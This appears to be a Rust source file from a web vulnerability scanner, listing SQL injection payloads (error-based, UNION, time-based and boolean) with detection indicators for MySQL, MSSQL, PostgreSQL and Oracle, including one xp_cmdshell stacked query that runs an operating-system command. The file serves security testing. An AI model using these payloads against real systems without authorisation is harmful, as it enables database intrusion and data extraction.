use crate::domain::active_vuln::{ExpectedIndicator, PayloadDefinition};
use crate::domain::entities::SeverityLevel;

pub fn get_error_based() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "sqli_error_01".into(),
            payload: "'".into(),
            description: "Single quote — triggers SQL syntax error".into(),
            expected_indicator: ExpectedIndicator::ErrorPattern("SQL syntax".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_error_02".into(),
            payload: "''".into(),
            description: "Double single-quote — tests escaping".into(),
            expected_indicator: ExpectedIndicator::ErrorPattern("syntax error".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_error_03".into(),
            payload: "' AND 1=CONVERT(int,(SELECT @@version))--".into(),
            description: "MSSQL version extraction via CONVERT error".into(),
            expected_indicator: ExpectedIndicator::ErrorPattern("nvarchar".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_error_04".into(),
            payload: "' AND extractvalue(1,concat(0x7e,version()))--".into(),
            description: "MySQL extractvalue error-based extraction".into(),
            expected_indicator: ExpectedIndicator::ErrorPattern("XPATH syntax".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_error_05".into(),
            payload: "1' AND 1=1--".into(),
            description: "Boolean true condition — compare with false".into(),
            expected_indicator: ExpectedIndicator::ErrorPattern("error".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_error_06".into(),
            payload: "'; DECLARE @x varchar(50); SET @x=CAST(1/0 AS varchar);--".into(),
            description: "MSSQL Divide by zero error".into(),
            expected_indicator: ExpectedIndicator::ErrorPattern("Divide by zero".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_error_07".into(),
            payload: "' OR 1=CAST((SELECT CHR(126)||version()||CHR(126)) AS numeric)--".into(),
            description: "PostgreSQL invalid input syntax error".into(),
            expected_indicator: ExpectedIndicator::ErrorPattern("invalid input syntax".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_error_08".into(),
            payload: "' AND (SELECT 1 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--".into(),
            description: "MySQL duplicate entry error".into(),
            expected_indicator: ExpectedIndicator::ErrorPattern("Duplicate entry".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_error_09".into(),
            payload: "' AND (SELECT dbms_xdb_version.checkin((SELECT user FROM dual)))--".into(),
            description: "Oracle Error Based".into(),
            expected_indicator: ExpectedIndicator::ErrorPattern("ORA-".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_error_10".into(),
            payload: "\"".into(),
            description: "Double quote — triggers SQL syntax error".into(),
            expected_indicator: ExpectedIndicator::ErrorPattern("SQL syntax".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
    ]
}

pub fn get_union_based() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "sqli_union_01".into(),
            payload: "' UNION SELECT NULL--".into(),
            description: "Union with 1 column NULL probe".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "column_count_match".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_union_02".into(),
            payload: "' UNION SELECT NULL,NULL--".into(),
            description: "Union with 2 column NULL probe".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "column_count_match".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_union_03".into(),
            payload: "' UNION SELECT NULL,NULL,NULL--".into(),
            description: "Union with 3 column NULL probe".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "column_count_match".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_union_04".into(),
            payload: "' ORDER BY 1--".into(),
            description: "ORDER BY column enumeration start".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "order_by_success".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_union_05".into(),
            payload: "' UNION ALL SELECT NULL,NULL,NULL,NULL--".into(),
            description: "Union with 4 column NULL probe".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "column_count_match".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_union_06".into(),
            payload: "' UNION SELECT 'LimmaProbe'--".into(),
            description: "Union with string probe".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "string_probe_match".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_union_07".into(),
            payload: "' UNION SELECT NULL, 'LimmaProbe'--".into(),
            description: "Union with string probe 2 columns".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "string_probe_match".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
    ]
}

pub fn get_time_based() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "sqli_time_01".into(),
            payload: "' AND SLEEP(5)--".into(),
            description: "MySQL time-based blind with SLEEP".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_time_02".into(),
            payload: "'; WAITFOR DELAY '0:0:5'--".into(),
            description: "MSSQL time-based blind with WAITFOR".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_time_03".into(),
            payload: "' AND pg_sleep(5)--".into(),
            description: "PostgreSQL time-based blind with pg_sleep".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_time_04".into(),
            payload: "'||(SELECT sleep(5))||'".into(),
            description: "MySQL time-based concatenation".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_time_05".into(),
            payload: "'; SELECT pg_sleep(5);--".into(),
            description: "PostgreSQL stacked queries time delay".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_time_06".into(),
            payload: "'; EXEC xp_cmdshell 'ping -n 6 127.0.0.1';--".into(),
            description: "MSSQL xp_cmdshell ping delay (6 packets = ~5 seconds)".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: "sqli_time_07".into(),
            payload: "1 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL)".into(),
            description: "MySQL inline sleep".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_time_08".into(),
            payload: "1' AND (SELECT 5555 FROM (SELECT(SLEEP(5)))a)--".into(),
            description: "MySQL derived table sleep".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
    ]
}

pub fn get_boolean_based() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "sqli_bool_01".into(),
            payload: "' AND 1=1--".into(),
            description: "Boolean true condition (should return normal)".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "true_condition".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_bool_02".into(),
            payload: "' AND 1=2--".into(),
            description: "Boolean false condition (should differ from true)".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "false_condition".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_bool_03".into(),
            payload: "1 OR 1=1".into(),
            description: "Integer based true condition".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "true_condition".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_bool_04".into(),
            payload: "1 OR 1=2".into(),
            description: "Integer based false condition".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "false_condition".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_bool_05".into(),
            payload: "' AND 'A'='A".into(),
            description: "String based true condition".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "true_condition".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_bool_06".into(),
            payload: "' AND 'A'='B".into(),
            description: "String based false condition".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "false_condition".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_bool_07".into(),
            payload: "' OR (SELECT 1)=1--".into(),
            description: "Subquery true condition".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "true_condition".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "sqli_bool_08".into(),
            payload: "' OR (SELECT 1)=2--".into(),
            description: "Subquery false condition".into(),
            expected_indicator: ExpectedIndicator::ResponseDiff {
                baseline_hash: String::new(),
                indicator: "false_condition".into(),
            },
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        }
    ]
}
